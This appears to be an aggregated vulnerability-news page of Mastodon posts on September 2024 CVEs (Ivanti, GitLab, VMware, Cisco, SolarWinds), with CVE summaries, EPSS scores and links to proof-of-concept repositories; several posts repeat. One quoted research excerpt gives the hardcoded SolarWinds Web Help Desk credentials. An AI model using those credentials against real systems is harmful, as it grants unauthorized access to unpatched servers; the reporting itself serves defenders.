##
iulianvostrut@mastodon.social at 2024-09-20T04:29:34.000Z ##

Urgent Alert: Critical Security Flaw (CVE-2024-8963) in Ivanti CSA being actively exploited! Unauthenticated attackers can bypass admin authentication and execute arbitrary commands. Stay vigilant and implement necessary patches immediately to safeguard your systems.

##
screaminggoat at 2024-09-19T18:32:43.644Z ##

CISA: Ivanti Releases Admin Bypass Security Update for Cloud Services Appliance
Wow, CISA actually wrote a useful cybersecurity alert. Instead of just saying "Ivanti released a security update, go look at the vendor's advisory," this actually states that the vendor noted limited exploitation of CVE-2024-8963, and that when chained with CVE-2024-8190, an attacker can take control of an affected system. CISA also mentions that CVE-2024-8963 in the KEV Catalog now.

#CVE_2024_8190 #CVE_2024_8963 #Ivanti #zeroday #activeexploitation #cve #vulnerability #CISA #KEV #knownexploitedvulnerabilitiescatalog

CISA: CISA Adds One Known Exploited Vulnerability to Catalog (link updated)
HOT OFF THE PRESS! CVE-2024-8963 Ivanti Cloud Services Appliance (CSA) Path Traversal Vulnerability.

##
screaminggoat at 2024-09-19T16:26:12.067Z ##

Ivanti exploited zero-day: Security Advisory Ivanti CSA 4.6 (Cloud Services Appliance) (CVE-2024-8963)
CVE-2024-8963 (9.4 critical) Path Traversal in the Ivanti CSA before 4.6 Patch 519 allows a remote unauthenticated attacker to access restricted functionality.

This was originally reported at least 8 hours ago but Ivanti deleted their blog post and the security advisory required logging in. See parent toot above. Now the information is public.

According to the security advisory, it was chained with CVE-2024-8190 (7.2 high, disclosed 10 September 2024 by Ivanti, added to CISA KEV Catalog 13 September 2024) Ivanti Cloud Services Appliance OS command injection vulnerability so "an attacker can bypass admin authentication and execute arbitrary commands on the appliance."

#Ivanti #vulnerability #ivanticsa #cve #CVE_2024_8963 #zeroday #eitw #activeexploitation

##
screaminggoat at 2024-09-19T11:09:20.310Z ##

Ivanti originally published a blog post Cloud Service Appliance 4.6 Security Update which updated the RSS feed. However, they deleted it. 🤔

From what I can infer from the blog post, the vulnerability is an exploited zero-day in Ivanti Cloud Service Appliance 4.6, "which was incidentally resolved in the patch released 10 September." The URL for the now loginwall'ed security advisory shows that the CVE ID is CVE-2024-8963. CVE.org, MITRE and NVD have varying responses for that number from Reserved by CNA to CVE Not Found.

  • We are aware of a limited number of customers who have been exploited by this vulnerability.
  • This vulnerability does not impact any other Ivanti products or solutions.
  • Ivanti CSA 4.6 is end-of-life and Ivanti strongly recommends that customers transition to Ivanti CSA 5.0 as it is supported and is not affected by this vulnerability.

cc: @campuscodi @goatyell

#Ivanti #vulnerability #ivanticsa #cve #CVE_2024_8963

##
screaminggoat@infosec.exchange at 2024-09-19T18:32:43.000Z ##

Wow, CISA actually wrote a useful cybersecurity alert. Instead of just saying "Ivanti released a security update, go look at the vendor's advisory," this actually states that the vendor noted limited exploitation of CVE-2024-8963, and that when chained with CVE-2024-8190, an attacker can take control of an affected system. CISA also mentions that CVE-2024-8963 in the KEV Catalog now.

#CVE_2024_8190 #CVE_2024_8963 #Ivanti #zeroday #activeexploitation #cve #vulnerability #CISA #KEV #knownexploitedvulnerabilitiescatalog

screaminggoat@infosec.exchange at 2024-09-19T11:09:20.000Z ##

Ivanti originally published a blog post Cloud Service Appliance 4.6 Security Update which updated the RSS feed. However, they deleted it. 🤔

From what I can infer from the blog post, the vulnerability is an exploited zero-day in Ivanti Cloud Service Appliance 4.6, "which was incidentally resolved in the patch released 10 September." The URL for the now loginwall'ed security advisory shows that the CVE ID is CVE-2024-8963. CVE.org, MITRE and NVD have varying responses for that number from Reserved by CNA to CVE Not Found.

  • We are aware of a limited number of customers who have been exploited by this vulnerability.
  • This vulnerability does not impact any other Ivanti products or solutions.
  • Ivanti CSA 4.6 is end-of-life and Ivanti strongly recommends that customers transition to Ivanti CSA 5.0 as it is supported and is not affected by this vulnerability.

##

CVE-2024-45409
(9.8 CRITICAL)

EPSS: 0.09%

updated 2024-09-20T14:13:10.700000

1 posts

The Ruby SAML library is for implementing the client side of a SAML authorization. Ruby-SAML in <= 12.2 and 1.13.0 <= 1.16.0 does not properly verify the signature of the SAML Response. An unauthenticated attacker with access to any signed saml document (by the IdP) can thus forge a SAML Response/Assertion with arbitrary contents. This would allow the attacker to log in as arbitrary user within th

screaminggoat@infosec.exchange at 2024-09-17T19:29:42.000Z ##

GitLab security advisory: GitLab Critical Patch Release: 17.3.3, 17.2.7, 17.1.8, 17.0.8, 16.11.10
CVE-2024-45409 (perfect 10.0 critical 🥳 cc: @cR0w) SAML authentication bypass

GitLab doing me a heccin' concern because they're already talking about detecting unsuccessful and successful exploitation attempts. I can't definitively say if exploitation in the wild occurred based on the verbiage in this advisory.

cc: @campuscodi @goatyell @da_667

#CVE_2024_45409 #GitLab #vulnerability #CVE

##

CVE-2024-38813
(7.5 HIGH)

EPSS: 0.04%

updated 2024-09-20T12:30:51.220000

3 posts

The vCenter Server contains a privilege escalation vulnerability. A malicious actor with network access to vCenter Server may trigger this vulnerability to escalate privileges to root by sending a specially crafted network packet.

jos1264@social.skynetcloud.site at 2024-09-18T11:20:02.000Z ##

Critical VMware vCenter Server bugs fixed (CVE-2024-38812) https://www.helpnetsecurity.com/2024/09/18/cve-2024-38812-cve-2024-38813/ #securityupdate #virtualization #vulnerability #Don'tmiss #Hotstuff #Broadcom #VMware #News #CVE

##
screaminggoat@infosec.exchange at 2024-09-17T19:50:13.000Z ##

Security Week: VMware Patches Remote Code Execution Flaw Found in Chinese Hacking Contest
Security Week links the VMware vCenter vulnerabilities CVE-2024-38812 and CVE-2024-38813 (see parent toot above for the security advisory) to the 2024 Matrix Cup contest. @nattothoughts has thoughts on that: Matrix Cup: Cultivating Top Hacking Talent, Keeping Close Hold on Results

It prioritizes new talent cultivation and expands the access of intelligence agencies to critical vulnerabilities, as the vulnerabilities found in the contest are likely channeled to the Ministry of State Security (MSS) for potential use in offensive operations.

#CVE_2024_38812 #matrixcup #CVE_2024_38813 #vmware #vulnerability #CVE #vCenter

##
screaminggoat@infosec.exchange at 2024-09-17T19:37:18.000Z ##

VMware security advisory: VMSA-2024-0019

  • CVE-2024-38812 (9.8 critical) VMware vCenter Server heap-overflow vulnerability
  • CVE-2024-38813 (7.5 high) VMware vCenter privilege escalation vulnerability

According to the stupid bit.ly shortened link to the Frequently Asked Questions:

Broadcom is not currently aware of exploitation “in the wild.” If that changes the advisory and this document will be updated. Please subscribe to the VMSA mailing list (link above) for proactive alerts.

Obligatory fuck Broadcom.

#vmware #vcenter #vulnerability #cve #CVE_2024_38812 #CVE_2024_38813

##

CVE-2024-38812
(9.8 CRITICAL)

EPSS: 0.04%

updated 2024-09-20T12:30:51.220000

5 posts

The vCenter Server contains a heap-overflow vulnerability in the implementation of the DCERPC protocol. A malicious actor with network access to vCenter Server may trigger this vulnerability by sending a specially crafted network packet potentially leading to remote code execution.

1 repos

https://github.com/maybeheisenberg/CVE-2024-38812

benzogaga33@mamot.fr at 2024-09-18T09:40:03.000Z ##

VMware vCenter Server vulnérable à une exécution de code à distance (CVE-2024-38812) https://www.it-connect.fr/vmware-vcenter-server-vulnerable-a-une-execution-de-code-a-distance-cve-2024-38812/ #ActuCybersécurité #Cybersécurité #Vulnérabilité #VMware

##
decio@infosec.exchange at 2024-09-18T07:19:06.000Z ##

"VMware Patches Remote Code Execution Flaw Found in Chinese Hacking Contest"
⬇️
"The most severe of the two, tagged as CVE-2024-38812 ... VMware warned that an attacker with network access to the server could send a specially crafted packet to execute remote code. The flaw carries a CVSS severity score of 9.8/10."
⬇️
"Chinese law dictates that zero-day vulnerabilities found by citizens must be promptly disclosed to the government. The details of a security hole cannot be sold or provided to any third-party, apart from the product’s manufacturer. The cybersecurity industry has raised concerns that the law will help the Chinese government stockpile zero-days."
👇
https://www.securityweek.com/vmware-patches-remote-code-execution-flaw-found-in-chinese-hacking-contest/
⬇️
🩹
👇
https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/SecurityAdvisories/0/24968

#VMware #CVE_2024_38812 #cyberveille #broadcom #vulnerability

CVE-2024-8904
(8.8 HIGH)

EPSS: 0.04%

updated 2024-09-20T12:30:51.220000

1 posts

Type Confusion in V8 in Google Chrome prior to 129.0.6668.58 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page. (Chromium security severity: High)

screaminggoat@infosec.exchange at 2024-09-17T22:02:54.000Z ##

Google Chrome security advisory: Stable Channel Update for Desktop
Chrome 129.0.6668.58 (Linux) and 129.0.6668.58/.59 (Windows and Mac) has 9 security fixes, 6 externally reported.

  1. CVE-2024-8904 (high) Type Confusion in V8.
  2. CVE-2024-8905 (medium) Inappropriate implementation in V8
  3. CVE-2024-8906 (medium) Incorrect security UI in Downloads
  4. CVE-2024-8907 (medium) Insufficient data validation in Omnibox
  5. CVE-2024-8908 (low) Inappropriate implementation in Autofill
  6. CVE-2024-8909 (low) Inappropriate implementation in UI

No mention of exploitation. A mini #PatchTuesday today after seeing VMware and GitLab.

#Google #Chrome #vulnerability #CVE

##
screaminggoat@infosec.exchange at 2024-09-18T14:09:44.000Z ##

CISA: CISA Adds Five Known Vulnerabilities to Catalog
This is so hot off the press that CISA's press team hasn't created the page yet. 5 are being added to the KEV:

  • CVE-2020-14644 (9.8 critical) Oracle WebLogic Server Remote Code Execution Vulnerability
  • CVE-2022-21445 (9.8 critical) Oracle JDeveloper Remote Code Execution Vulnerability
  • CVE-2019-1069 (7.8 high) Microsoft Windows Task Scheduler Privilege Escalation Vulnerability
  • CVE-2020-0618 (8.8 high) Microsoft SQL Server Reporting Services Remote Code Execution Vulnerability
  • CVE-2024-27348 (9.8 critical) Apache HugeGraph-Server Improper Access Control Vulnerability

#Cisa #KEV #vulnerability #knownexploitedvulnerabilitiescatalog #CVE #eitw #activeexploitation

  • CVE-2024-43489 (6.5 medium) Microsoft Edge (Chromium-based) Remote Code Execution Vulnerability
  • CVE-2024-43496 (6.5 medium) Microsoft Edge (Chromium-based) Remote Code Execution Vulnerability

CISA: CISA Adds Four Known Exploited Vulnerabilities to Catalog
Hot off the press! CISA added 4 vulnerabilities to the KEV Catalog

  • CVE-2014-0502 (CVSSv2: 10.0 HIGH) Adobe Flash Player Double Free Vulnerablity
  • CVE-2013-0648 (CVSSv2: 9.3 HIGH) Adobe Flash Player Code Execution Vulnerability
  • CVE-2013-0643 (CVSSv2: 9.3 HIGH) Adobe Flash Player Incorrect Default Permissions Vulnerability
  • CVE-2014-0497 (CVSSv2: 10.0 HIGH) Adobe Flash Player Integer Underflow Vulnerablity

cc: @ntkramer @hrbrmstr @neurovagrant (KEV RSS feed took 30 minutes to pick it up, CISA took 1 hour to make the page live)

#cisa #kev #vulnerability #eitw #activeexploitation #CVE #knownexploitedvulnerabilitiescatalog

CVE-2013-0643
(8.8 HIGH)

EPSS: 25.77%

updated 2024-09-19T19:48:10.033000

2 posts

The Firefox sandbox in Adobe Flash Player before 10.3.183.67 and 11.x before 11.6.602.171 on Windows and Mac OS X, and before 10.3.183.67 and 11.x before 11.2.202.273 on Linux, does not properly restrict privileges, which makes it easier for remote attackers to execute arbitrary code via crafted SWF content, as exploited in the wild in February 2013.

##

CVE-2020-14644
(9.8 CRITICAL)

EPSS: 24.29%

updated 2024-09-19T01:00:03.107000

2 posts

Vulnerability in the Oracle WebLogic Server product of Oracle Fusion Middleware (component: Core). Supported versions that are affected are 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via IIOP, T3 to compromise Oracle WebLogic Server. Successful attacks of this vulnerability can result in takeover of Oracle WebLogic Se

Vendor: Oracle
Product: WebLogic Server
Date Added: 2024-09-18

##
screaminggoat@infosec.exchange at 2024-09-18T14:09:44.000Z ##

CISA: CISA Adds Five Known Vulnerabilities to Catalog
This is so hot off the press that CISA's press team hasn't created the page yet. 5 are being added to the KEV:

  • CVE-2020-14644 (9.8 critical) Oracle WebLogic Server Remote Code Execution Vulnerability
  • CVE-2022-21445 (9.8 critical) Oracle JDeveloper Remote Code Execution Vulnerability
  • CVE-2019-1069 (7.8 high) Microsoft Windows Task Scheduler Privilege Escalation Vulnerability
  • CVE-2020-0618 (8.8 high) Microsoft SQL Server Reporting Services Remote Code Execution Vulnerability
  • CVE-2024-27348 (9.8 critical) Apache HugeGraph-Server Improper Access Control Vulnerability

#Cisa #KEV #vulnerability #knownexploitedvulnerabilitiescatalog #CVE #eitw #activeexploitation

CVE-2013-0648
(8.8 HIGH)

EPSS: 25.77%

updated 2024-09-18T21:30:37

2 posts

Unspecified vulnerability in the ExternalInterface ActionScript functionality in Adobe Flash Player before 10.3.183.67 and 11.x before 11.6.602.171 on Windows and Mac OS X, and before 10.3.183.67 and 11.x before 11.2.202.273 on Linux, allows remote attackers to execute arbitrary code via crafted SWF content, as exploited in the wild in February 2013.

screaminggoat@infosec.exchange at 2024-09-17T14:21:39.000Z ##

CISA: CISA Adds Four Known Exploited Vulnerabilities to Catalog
Hot off the press! CISA added 4 vulnerabilities to the KEV Catalog

  • CVE-2014-0502 (CVSSv2: 10.0 HIGH) Adobe Flash Player Double Free Vulnerablity
  • CVE-2013-0648 (CVSSv2: 9.3 HIGH) Adobe Flash Player Code Execution Vulnerability
  • CVE-2013-0643 (CVSSv2: 9.3 HIGH) Adobe Flash Player Incorrect Default Permissions Vulnerability
  • CVE-2014-0497 (CVSSv2: 10.0 HIGH) Adobe Flash Player Integer Underflow Vulnerablity

cc: @ntkramer @hrbrmstr @neurovagrant (KEV RSS feed took 30 minutes to pick it up, CISA took 1 hour to make the page live)

#cisa #kev #vulnerability #eitw #activeexploitation #CVE #knownexploitedvulnerabilitiescatalog

CVE-2024-8905
(8.8 HIGH)

EPSS: 0.04%

updated 2024-09-18T18:31:53

1 posts

Inappropriate implementation in V8 in Google Chrome prior to 129.0.6668.58 allowed a remote attacker to potentially exploit stack corruption via a crafted HTML page. (Chromium security severity: Medium)

screaminggoat@infosec.exchange at 2024-09-17T22:02:54.000Z ##

Google Chrome security advisory: Stable Channel Update for Desktop
Chrome 129.0.6668.58 (Linux) and 129.0.6668.58/.59 (Windows and Mac) has 9 security fixes, 6 externally reported.

  1. CVE-2024-8904 (high) Type Confusion in V8.
  2. CVE-2024-8905 (medium) Inappropriate implementation in V8
  3. CVE-2024-8906 (medium) Incorrect security UI in Downloads
  4. CVE-2024-8907 (medium) Insufficient data validation in Omnibox
  5. CVE-2024-8908 (low) Inappropriate implementation in Autofill
  6. CVE-2024-8909 (low) Inappropriate implementation in UI

No mention of exploitation. A mini #PatchTuesday today after seeing VMware and GitLab.

#Google #Chrome #vulnerability #CVE

tecteschi@mastodon.social at 2024-09-23T05:48:31.000Z ##

https://go.twuai.com/ping/7417711362102369846 Investigadores de seguridad de Akamai han identificado una vulnerabilidad crítica en las cámaras de seguridad AVTECH, conocida como CVE-2024-7029. Esta falla permite a atacantes remotos inyectar comandos y tomar control de los dispositivos afectados, facilitando la propagación de la botnet "Corona Mirai".

La vulnerabilidad se localiza en la función de "brillo" del firmware de las cámaras y fue descubierta por Aline...

##

CVE-2021-35232
(6.1 MEDIUM)

EPSS: 0.04%

updated 2024-09-17T04:16:51.820000

2 posts

Hard coded credentials discovered in SolarWinds Web Help Desk product. Through these credentials, the attacker with local access to the Web Help Desk host machine allows to execute arbitrary HQL queries against the database and leverage the vulnerability to steal the password hashes of the users or insert arbitrary data into the database.

screaminggoat at 2024-09-25T11:47:09.581Z ##

Horizon3: CVE-2024-28987: SolarWinds Web Help Desk Hardcoded Credential Vulnerability Deep-Dive
Reference: CVE-2024-28987 (CVSSv3.1: 9.1 critical, disclosed 22 August 2024 by SolarWinds) The SolarWinds Web Help Desk (WHD) software is affected by a hardcoded credential vulnerability, allowing remote unauthenticated user to access internal functionality and modify data. See parent toot above.

Apparently @hacks_zach found this vulnerability while looking for CVE-2024-28986 (9.8 critical, disclosed 13 August 2024 by SolarWinds, added to CISA KEV Catalog 15 August 2024) SolarWinds Web Help Desk Deserialization of Untrusted Data Vulnerability. While patch diffing for CVE-2024-28986, and referencing prior vulnerability research like (AssetNote's blog on CVE-2021-35232),

After inspecting many of them, we happen upon the /OrionTickets/* endpoints. These endpoints all map to the OrionTicketController, which extends the com.macsdesign.whd.rest.controllers.BasicAuthRouteController for performing authentication, and has no restrictions on the requesting IP address being localhost like many other controllers enforce.
The BasicAuthRouteController allows a hardcoded set of credentials to access any resources that utilize this controller. The credentials are "helpdeskIntegrationUser" and "dev-C4F8025E7".
While the patch for CVE-2021-35232 made the effort to make the global credentials declared in AppProperties random on each boot, this set of credentials were missed because they were directly referenced.

Proof of Concept is provided. Zach also suggests software development best practice (use "magic strings") and describes where to find indicators of compromise. "At the time of writing this, there are approximately 827 instances of SolarWinds Web Help Desk reachable on the internet."

#CVE_2024_28987 #SolarWinds #WebHelpDesk #vulnerability #CVE #ProofofConcept #poc #rootcauseanalysis

##
screaminggoat@infosec.exchange at 2024-09-25T11:47:09.000Z ##

Horizon3: CVE-2024-28987: SolarWinds Web Help Desk Hardcoded Credential Vulnerability Deep-Dive
Reference: CVE-2024-28987 (CVSSv3.1: 9.1 critical, disclosed 22 August 2024 by SolarWinds) The SolarWinds Web Help Desk (WHD) software is affected by a hardcoded credential vulnerability, allowing remote unauthenticated user to access internal functionality and modify data. See parent toot above.

Apparently @hacks_zach found this vulnerability while looking for CVE-2024-28986 (9.8 critical, disclosed 13 August 2024 by SolarWinds, added to CISA KEV Catalog 15 August 2024) SolarWinds Web Help Desk Deserialization of Untrusted Data Vulnerability. While patch diffing for CVE-2024-28986, and referencing prior vulnerability research like (AssetNote's blog on CVE-2021-35232),

After inspecting many of them, we happen upon the /OrionTickets/* endpoints. These endpoints all map to the OrionTicketController, which extends the com.macsdesign.whd.rest.controllers.BasicAuthRouteController for performing authentication, and has no restrictions on the requesting IP address being localhost like many other controllers enforce.
The BasicAuthRouteController allows a hardcoded set of credentials to access any resources that utilize this controller. The credentials are "helpdeskIntegrationUser" and "dev-C4F8025E7".
While the patch for CVE-2021-35232 made the effort to make the global credentials declared in AppProperties random on each boot, this set of credentials were missed because they were directly referenced.

Proof of Concept is provided. Zach also suggests software development best practice (use "magic strings") and describes where to find indicators of compromise. "At the time of writing this, there are approximately 827 instances of SolarWinds Web Help Desk reachable on the internet."

#CVE_2024_28987 #SolarWinds #WebHelpDesk #vulnerability #CVE #ProofofConcept #poc #rootcauseanalysis

##

CVE-2024-28990
(9.8 CRITICAL)

EPSS: 0.20%

updated 2024-09-16T18:05:28.957000

1 posts

SolarWinds Access Rights Manager (ARM) was found to contain a hard-coded credential authentication bypass vulnerability. If exploited, this vulnerability would allow access to the RabbitMQ management console. We thank Trend Micro Zero Day Initiative (ZDI) for its ongoing partnership in coordinating with SolarWinds on responsible disclosure of this and other potential vulnerabilities.

screaminggoat@infosec.exchange at 2024-09-18T11:50:52.000Z ##

@chudypb mentioned this earlier in the parent toot above but I'll include the security advisory now that it's live:
SolarWinds: SolarWinds Access Rights Manager (ARM) Hardcoded Credentials Authentication Bypass Vulnerability (CVE-2024-28990)
CVE-2024-28990 (6.3 medium, CVE was assigned 12 September 2024)
SolarWinds Access Rights Manager (ARM) was found to contain a hard-coded credential authentication bypass vulnerability. If exploited, this vulnerability would allow access to the RabbitMQ management console.

#CVE_2024_28990 #SolarWinds #vulnerability #CVE

##

CVE-2024-8190
(7.2 HIGH)

EPSS: 15.12%

updated 2024-09-16T13:44:18.173000

5 posts

An OS command injection vulnerability in Ivanti Cloud Services Appliance versions 4.6 Patch 518 and before allows a remote authenticated attacker to obtain remote code execution. The attacker must have admin level privileges to exploit this vulnerability.

1 repos

https://github.com/horizon3ai/CVE-2024-8190

screaminggoat at 2024-09-19T18:32:43.644Z ##

CISA: Ivanti Releases Admin Bypass Security Update for Cloud Services Appliance
Wow, CISA actually wrote a useful cybersecurity alert. Instead of just saying "Ivanti released a security update, go look at the vendor's advisory," this actually states that the vendor noted limited exploitation of CVE-2024-8963, and that when chained with CVE-2024-8190, an attacker can take control of an affected system. CISA also mentions that CVE-2024-8963 in the KEV Catalog now.

#CVE_2024_8190 #CVE_2024_8963 #Ivanti #zeroday #activeexploitation #cve #vulnerability #CISA #KEV #knownexploitedvulnerabilitiescatalog

##
screaminggoat at 2024-09-19T16:26:12.067Z ##

Ivanti exploited zero-day: Security Advisory Ivanti CSA 4.6 (Cloud Services Appliance) (CVE-2024-8963)
CVE-2024-8963 (9.4 critical) Path Traversal in the Ivanti CSA before 4.6 Patch 519 allows a remote unauthenticated attacker to access restricted functionality.

This was originally reported at least 8 hours ago but Ivanti deleted their blog post and the security advisory required logging in. See parent toot above. Now the information is public.

According to the security advisory, it was chained with CVE-2024-8190 (7.2 high, disclosed 10 September 2024 by Ivanti, added to CISA KEV Catalog 13 September 2024) Ivanti Cloud Services Appliance OS command injection vulnerability so "an attacker can bypass admin authentication and execute arbitrary commands on the appliance."

#Ivanti #vulnerability #ivanticsa #cve #CVE_2024_8963 #zeroday #eitw #activeexploitation

Docker security advisory: Docker Desktop release notes 4.34.2

  • CVE-2024-8695 (9.0 critical) RCE via crafted extension description/changelog
  • CVE-2024-8696 (8.9 high) RCE via crafted extension publisher-url/additional-urls

Disclosed 12 September 2024, I figure someone would be worried about it. No mention of exploitation.

screaminggoat at 2024-09-25T16:31:31.295Z ##

Happy #PatchTuesday (on a Wednesday) from Cisco as they drop 15 new security advisories:

  • Cisco IOS XE Software Web UI Cross-Site Request Forgery Vulnerability CVE-2024-20437 (8.1 high)
  • Cisco Catalyst SD-WAN Routers Denial of Service Vulnerability CVE-2024-20455 (8.6 high)
  • Cisco IOS and IOS XE Software Resource Reservation Protocol Denial of Service Vulnerability CVE-2024-20433 (8.6 high)
  • Cisco IOS XE Software Protocol Independent Multicast Denial of Service Vulnerability CVE-2024-20464 (8.6 high)
  • Cisco IOS XE Software SD-Access Fabric Edge Node Denial of Service Vulnerability CVE-2024-20480 (8.6 high)
  • Cisco IOS XE Software HTTP Server Telephony Services Denial of Service Vulnerability CVE-2024-20436 (8.6 high)
  • Cisco Catalyst Center Static SSH Host Key Vulnerability CVE-2024-20350 (7.5 high)
  • Cisco IOS XE Software IPv4 Fragmentation Reassembly Denial of Service Vulnerability CVE-2024-20467 (8.6 high)
  • Cisco Catalyst 9000 Series Switches Denial of Service Vulnerability CVE-2024-20434 (4.3 medium)
  • Cisco Unified Threat Defense Snort Intrusion Prevention System Engine for Cisco IOS XE Software Security Policy Bypass and Denial of Service Vulnerability CVE-2024-20508 (5.8 medium)
  • Cisco Catalyst SD-WAN Manager Cross-Site Scripting Vulnerability CVE-2024-20475 (6.4 medium)
  • Cisco SD-WAN vEdge Software UDP Packet Validation Denial of Service Vulnerability CVE-2024-20496 (6.1 medium)
  • Cisco IOS Software on Cisco Industrial Ethernet Series Switches Access Control List Bypass Vulnerability CVE-2024-20465 (5.8 medium)
  • Cisco IOS and IOS XE Software Web UI Cross-Site Request Forgery Vulnerability CVE-2024-20414 (6.5 medium)
  • Cisco IOS XE Software for Wireless Controllers CWA Pre-Authentication ACL Bypass Vulnerability CVE-2024-20510 (4.7 medium)

You can have an updated security advisory, as a treat: Multiple Cisco Products Web-Based Management Interface Privilege Escalation Vulnerability CVE-2024-20381 (8.8 high, disclosed 11 September 2024) was updated for "Clarified affected products and vulnerable configuration."

The Cisco Product Security Incident Response Team (PSIRT) is not aware of any public announcements or malicious use of the vulnerability that is described in these advisories.

#Cisco #vulnerability #CVE

screaminggoat@infosec.exchange at 2024-09-25T16:31:31.000Z ##

Happy #PatchTuesday (on a Wednesday) from Cisco as they drop 15 new security advisories:

  • Cisco IOS XE Software Web UI Cross-Site Request Forgery Vulnerability CVE-2024-20437 (8.1 high)
  • Cisco Catalyst SD-WAN Routers Denial of Service Vulnerability CVE-2024-20455 (8.6 high)
  • Cisco IOS and IOS XE Software Resource Reservation Protocol Denial of Service Vulnerability CVE-2024-20433 (8.6 high)
  • Cisco IOS XE Software Protocol Independent Multicast Denial of Service Vulnerability CVE-2024-20464 (8.6 high)
  • Cisco IOS XE Software SD-Access Fabric Edge Node Denial of Service Vulnerability CVE-2024-20480 (8.6 high)
  • Cisco IOS XE Software HTTP Server Telephony Services Denial of Service Vulnerability CVE-2024-20436 (8.6 high)
  • Cisco Catalyst Center Static SSH Host Key Vulnerability CVE-2024-20350 (7.5 high)
  • Cisco IOS XE Software IPv4 Fragmentation Reassembly Denial of Service Vulnerability CVE-2024-20467 (8.6 high)
  • Cisco Catalyst 9000 Series Switches Denial of Service Vulnerability CVE-2024-20434 (4.3 medium)
  • Cisco Unified Threat Defense Snort Intrusion Prevention System Engine for Cisco IOS XE Software Security Policy Bypass and Denial of Service Vulnerability CVE-2024-20508 (5.8 medium)
  • Cisco Catalyst SD-WAN Manager Cross-Site Scripting Vulnerability CVE-2024-20475 (6.4 medium)
  • Cisco SD-WAN vEdge Software UDP Packet Validation Denial of Service Vulnerability CVE-2024-20496 (6.1 medium)
  • Cisco IOS Software on Cisco Industrial Ethernet Series Switches Access Control List Bypass Vulnerability CVE-2024-20465 (5.8 medium)
  • Cisco IOS and IOS XE Software Web UI Cross-Site Request Forgery Vulnerability CVE-2024-20414 (6.5 medium)
  • Cisco IOS XE Software for Wireless Controllers CWA Pre-Authentication ACL Bypass Vulnerability CVE-2024-20510 (4.7 medium)

You can have an updated security advisory, as a treat: Multiple Cisco Products Web-Based Management Interface Privilege Escalation Vulnerability CVE-2024-20381 (8.8 high, disclosed 11 September 2024) was updated for "Clarified affected products and vulnerable configuration."

The Cisco Product Security Incident Response Team (PSIRT) is not aware of any public announcements or malicious use of the vulnerability that is described in these advisories.

##

CVE-2024-43461
(8.8 HIGH)

EPSS: 4.85%

updated 2024-09-10T18:30:54

1 posts

Windows MSHTML Platform Spoofing Vulnerability

oversecurity@mastodon.social at 2024-09-19T06:20:05.000Z ##

CISA Adds Progress WhatsUp Gold and MSHTML Vulnerabilities to Known Exploited Vulnerabilities Catalog

##

CVE-2024-29857
(5.3 MEDIUM)

EPSS: 0.00%

updated 2024-09-09T21:32:55

1 posts

An issue was discovered in ECCurve.java and ECCurve.cs in Bouncy Castle Java (BC Java) before 1.78, BC Java LTS before 2.73.6, BC-FJA before 1.0.2.5, and BC C# .Net before 2.3.1. Importing an EC certificate with crafted F2m parameters can lead to excessive CPU consumption during the evaluation of the curve parameters.

screaminggoat@infosec.exchange at 2024-09-18T14:57:24.000Z ##

Atlassian security advisory: Security Bulletin - September 17 2024
I keep forgetting that Atlassian does third Tuesday of the month for #PatchTuesday. Multiple products are updated:

  • Bamboo Data Center and Server: CVE-2024-34750 (7.5 High) DoS (Denial of Service)
  • Bitbucket Data Center and Server:
    • CVE-2024-32007 (7.5 High) DoS
    • CVE-2024-34750 (7.5 High) DoS
  • Confluence Data Center and Server:
    • CVE-2024-29857 (7.5 High) DoS
    • CVE-2024-22871 (7.5 High) DoS
  • Crowd Data Center and Server: CVE-2024-29857 (7.5 High) DoS

No mention of exploitation.

#Atlassian #Confluence #Bitbucket #Bamboo #vulnerability #CVE

CVE-2024-7923
(9.8 CRITICAL)

EPSS: 0.07%

updated 2024-09-05T21:38:32.257000

1 posts

An authentication bypass vulnerability has been identified in Pulpcore when deployed with Gunicorn versions prior to 22.0, due to the puppet-pulpcore configuration. This issue arises from Apache's mod_proxy not properly unsetting headers because of restrictions on underscores in HTTP headers, allowing authentication through a malformed header. This flaw impacts all active Satellite deployments (6.

One Identity Safeguard for Privileged Passwords before 7.5.2 allows unauthorized access because of an issue related to cookies. This only affects virtual appliance installations (VMware or HyperV). The fixed versions are 7.0.5.1 LTS, 7.4.2, and 7.5.2.

2 posts

##

CVE-2024-28987
(9.1 CRITICAL)

EPSS: 94.16%

updated 2024-08-22T00:31:11

4 posts

The SolarWinds Web Help Desk (WHD) software is affected by a hardcoded credential vulnerability, allowing remote unauthenticated user to access internal functionality and modify data.

Nuclei template

2 repos

https://github.com/fa-rrel/CVE-2024-28987-POC

https://github.com/horizon3ai/CVE-2024-28987

screaminggoat at 2024-09-25T11:47:09.581Z ##

Horizon3: CVE-2024-28987: SolarWinds Web Help Desk Hardcoded Credential Vulnerability Deep-Dive
Reference: CVE-2024-28987 (CVSSv3.1: 9.1 critical, disclosed 22 August 2024 by SolarWinds) The SolarWinds Web Help Desk (WHD) software is affected by a hardcoded credential vulnerability, allowing remote unauthenticated user to access internal functionality and modify data. See parent toot above.

Apparently @hacks_zach found this vulnerability while looking for CVE-2024-28986 (9.8 critical, disclosed 13 August 2024 by SolarWinds, added to CISA KEV Catalog 15 August 2024) SolarWinds Web Help Desk Deserialization of Untrusted Data Vulnerability. While patch diffing for CVE-2024-28986, and referencing prior vulnerability research like (AssetNote's blog on CVE-2021-35232),

After inspecting many of them, we happen upon the /OrionTickets/* endpoints. These endpoints all map to the OrionTicketController, which extends the com.macsdesign.whd.rest.controllers.BasicAuthRouteController for performing authentication, and has no restrictions on the requesting IP address being localhost like many other controllers enforce.
The BasicAuthRouteController allows a hardcoded set of credentials to access any resources that utilize this controller. The credentials are "helpdeskIntegrationUser" and "dev-C4F8025E7".
While the patch for CVE-2021-35232 made the effort to make the global credentials declared in AppProperties random on each boot, this set of credentials were missed because they were directly referenced.

Proof of Concept is provided. Zach also suggests software development best practice (use "magic strings") and describes where to find indicators of compromise. "At the time of writing this, there are approximately 827 instances of SolarWinds Web Help Desk reachable on the internet."

#CVE_2024_28987 #SolarWinds #WebHelpDesk #vulnerability #CVE #ProofofConcept #poc #rootcauseanalysis

##
screaminggoat@infosec.exchange at 2024-09-25T11:47:09.000Z ##

Horizon3: CVE-2024-28987: SolarWinds Web Help Desk Hardcoded Credential Vulnerability Deep-Dive
